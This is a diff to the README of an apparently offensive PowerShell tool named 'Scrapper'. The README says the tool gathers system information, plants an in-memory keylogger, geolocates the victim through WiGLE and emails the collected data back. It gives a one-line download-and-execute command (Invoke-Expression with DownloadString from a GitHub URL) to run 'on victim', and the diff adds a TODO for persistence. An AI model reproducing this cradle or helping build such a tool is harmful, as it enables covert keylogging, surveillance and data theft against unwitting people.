@@ -5,7 +5,7 @@
 ## Scrapper
 Powershell script that 
 - Gathers info
-- Plants a fileless kelyogger
+- Plants a in memory kelyogger
 - Finds the geolocation of the client through querrying the AP name in the Wiggle database
 - Sends all info through email back
 
@@ -16,3 +16,7 @@ Powershell script that
 - Run in powershell on victim : 
 
 ``` Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/yourGithubRepo/master/scrapper.ps1') ```
+
+
+## TODO
+- Add persistence
